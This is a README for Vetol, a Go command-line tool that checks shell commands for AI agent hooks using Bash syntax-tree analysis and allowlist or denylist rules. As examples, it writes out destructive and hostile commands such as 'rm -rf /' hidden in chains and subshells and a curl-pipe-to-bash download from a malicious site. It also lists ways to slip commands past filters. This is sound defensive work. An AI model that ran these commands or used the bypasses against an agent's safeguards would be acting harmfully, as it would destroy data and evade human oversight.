# Vetol - Vet agent tools

A CLI tool that validates shell commands using Bash AST analysis, designed for AI agent hooks and other security-sensitive execution environments.

## Overview

Regex-based and prefix-based command validation is insufficient because shell syntax can easily be used to bypass such checks.

**Problems with pattern-based validation:**

- **Command chaining**: `ls && rm -rf /` - Bypasses simple "rm" prefix checks
- **Command substitution**: `echo $(rm -rf /)` - Hides forbidden commands inside variable expansion
- **Pipelines and subshells**: Complex nesting can conceal forbidden operations
- **Combined short flags**: `git push -u -f` or `git push -uf` - Bypasses restrictive option validation (e.g., preventing `git push -f`)

These issues are particularly relevant in AI agent hooks and other automated execution environments where shell commands are filtered before execution.

**Vetol addresses these problems using two complementary techniques:**

1. **AST-based command validation**

Vetol parses the Bash Abstract Syntax Tree (AST) and validates every command node it encounters. This allows it to detect commands that appear inside:

- Command chains (`&&`, `||`, `;`)
- Pipelines (`|`)
- Command substitutions (`$()`, backticks)
- Subshells and other nested shell constructs

2. **Argument-aware include/exclude matching**

Vetol supports allowlist and denylist rules with dedicated matching for command arguments and flags. Short flags are normalized during matching, so a pattern such as `-f` matches all of the following:

- `-f`
- `-u -f`
- `-uf`

Long options and non-flag arguments are also supported.

Together, these mechanisms help prevent many common bypass techniques that are difficult to handle reliably with regular expressions alone.

## Installation

### Using `go install`

```bash
go install github.com/tf63/vetol/cmd/vetol@latest
```

## Usage

**Vetol** only validates the provided command string and never executes it.

```bash
$ vetol --config vetol.json "ls -la /tmp"
ALLOW
$ echo $?
0

$ vetol --config vetol.json "rm -rf /"
DENY
$ echo $?
1
```

### Configuration File

Rules are specified via a JSON configuration file:

```bash
vetol --config vetol.json "docker compose exec app rm -rf /"
```

**Configuration file format:**

```json
{
  "mode": "allowlist",
  "rules": [
    {
      "command": "ls",
      "include": ["-la"],
      "exclude": []
    },
    {
      "command": "grep",
      "include": ["-r"],
      "exclude": []
    },
    {
      "command": "docker compose"
    }
  ]
}
```

#### Rule Fields

- **command** (required): Command name or command prefix to match.
- **include** (optional): Additional patterns that must be present for the rule to match.
- **exclude** (optional): Patterns that prevent the rule from matching, even if all include conditions are satisfied.

#### Pattern Types

- **Short flags** (`-r`, `-la`): All characters must be present
- **Long flags** (`--color`, `--color=auto`): Exact or prefix match with `=`
- **Non-flag patterns**: Exact match required

### Command Line Options

- `--config <PATH>`: Path to JSON configuration file (REQUIRED)
- `<COMMAND_STRING>`: The bash command string to validate (positional argument)

## Features

- **AST-based parsing**: Detects commands hidden in nested shell constructs
- **Allowlist/Denylist modes**: Flexible security rule configuration
- **Command prefix matching**: Single and multi-word command matching (e.g., `docker compose`)
- **Include/Exclude constraints**: Fine-grained control with flag and pattern matching

- Short flag matching: Character containment (e.g., `-la` matches `-l -a`)
- Long flag matching: Prefix matching with values (e.g., `--color` matches `--color=auto`)
- Non-flag pattern matching: Exact match

- **Complex syntax support**: Handles pipes, substitutions, chains, redirects, and subshells
- **JSON configuration**: Load rules from configuration files

## Limitations

Vetol validates command structure through Bash AST analysis.

### What Vetol Cannot Detect

- **Commands in string arguments**: Commands hidden as string arguments are not detected

  - Example: `bash -c "rm -rf /"` - The `rm -rf /` inside the string argument is not detected
  - Other affected: `eval "dangerous command"`, `python -c "..."`, `node -e "..."`

- **Semantic analysis of arguments**: Only structure is validated, not argument content

  - Example: `curl https://malicious.site/script.sh | bash` - The script content is not analyzed

- **Behavior inside allowed binaries**: Malicious behavior within allowed commands cannot be detected

  - Example: An allowed binary could be trojanized or contain backdoors

- **Execution and sandboxing**: Vetol only validates structure, it does not:
  - Execute commands
  - Provide isolation or sandboxing
  - Prevent system-level attacks

### Mitigation Strategies

To address the string argument limitation, use denylist mode to block dangerous interpreter calls:

```json
{
  "mode": "denylist",
  "rules": [
    { "command": "bash", "include": ["-c"] },
    { "command": "sh", "include": ["-c"] },
    { "command": "eval" },
    { "command": "source" },
    { "command": "python", "include": ["-c"] },
    { "command": "node", "include": ["-e"] },
    { "command": "ruby", "include": ["-e"] },
    { "command": "perl", "include": ["-e"] }
  ]
}
```

This mitigates some of the most common techniques used to execute commands through string evaluation. However, it does not eliminate all possible execution paths.

## Examples

### Example 1: Basic Allowlist

Allow only `ls`, `cat`, and `echo`.

```json
{
  "mode": "allowlist",
  "rules": [{ "command": "ls" }, { "command": "cat" }, { "command": "echo" }]
}
```

```bash
vetol --config vetol.json "cat /etc/passwd"
# Output: ALLOW

vetol --config vetol.json "cat /etc/passwd && rm file.txt"
# Output: DENY
```

### Example 2: Required Flags

Require specific flags for allowed commands.

```json
{
  "mode": "allowlist",
  "rules": [
    {
      "command": "ls",
      "include": ["-la"]
    },
    {
      "command": "grep",
      "include": ["-r"]
    }
  ]
}
```

```bash
vetol --config vetol.json "ls -la /tmp"
# Output: ALLOW

vetol --config vetol.json "ls -l /tmp"
# Output: DENY

vetol --config vetol.json "grep -r pattern /tmp"
# Output: ALLOW
```

### Example 3: Basic Denylist

Block dangerous commands regardless of where they appear.

```json
{
  "mode": "denylist",
  "rules": [{ "command": "rm" }, { "command": "dd" }, { "command": "docker compose exec app rm" }]
}
```

```bash
vetol --config vetol.json "cat README.md"
# Output: ALLOW

vetol --config vetol.json "rm -rf /"
# Output: DENY

vetol --config vetol.json "docker compose exec app rm -rf /"
# Output: DENY
```

### Example 4: Denying Non-Interactive rm

Deny `rm` unless the interactive flag (`-i`) is present.

```json
{
  "mode": "denylist",
  "rules": [
    {
      "command": "rm",
      "exclude": ["-i"]
    }
  ]
}
```

```bash
vetol --config vetol.json "rm file.txt"
# Output: DENY

vetol --config vetol.json "rm -i file.txt"
# Output: ALLOW
```

### Example 5: Multi-Word Command Matching

Rules can match command prefixes consisting of multiple tokens.

```json
{
  "mode": "denylist",
  "rules": [
    {
      "command": "docker compose exec app rm"
    },
    {
      "command": "docker run"
    }
  ]
}
```

```bash
vetol --config vetol.json "docker ps"
# Output: ALLOW

vetol --config vetol.json "docker compose exec app rm -rf /"
# Output: DENY

vetol --config vetol.json "docker run -it ubuntu"
# Output: DENY
```

### Example 6: Detecting Commands Hidden in Shell Syntax

Vetol traverses the Bash AST and validates every command node, including commands hidden in nested shell constructs.

```bash
# Command substitution
vetol --config vetol.json 'echo $(rm -rf /)'
# Output: DENY

# Command chaining
vetol --config vetol.json "ls && rm -rf /"
# Output: DENY

# Pipelines
vetol --config vetol.json "pwd | grep test | rm"
# Output: DENY

# Subshell
vetol --config vetol.json "(rm -rf /)"
# Output: DENY
```

### Example 7: Short Flag Aggregation

Include and exclude matching works even when short flags are combined.

```json
{
  "mode": "denylist",
  "rules": [
    {
      "command": "git push",
      "include": ["-f"]
    }
  ]
}
```

```bash
vetol --config vetol.json "git push -f origin main"
# Output: DENY

vetol --config vetol.json "git push -u -f origin main"
# Output: DENY

vetol --config vetol.json "git push -uf origin main"
# Output: DENY
```

## Dependencies

- [**mvdan.cc/sh/v3/syntax**](https://github.com/mvdan/sh): Bash command parser and AST builder
- Go 1.26 standard library

## Development & Contributing

For development setup, testing, architecture details, and contribution guidelines, see [CONTRIBUTING.md](CONTRIBUTING.md).

## License

MIT

## Security Disclaimer

Vetol is a command validation tool, not a sandbox.

Passing validation does not guarantee that a command is safe to execute. Vetol should be used as one layer in a defense-in-depth security model alongside sandboxing, privilege separation, auditing, and runtime controls.
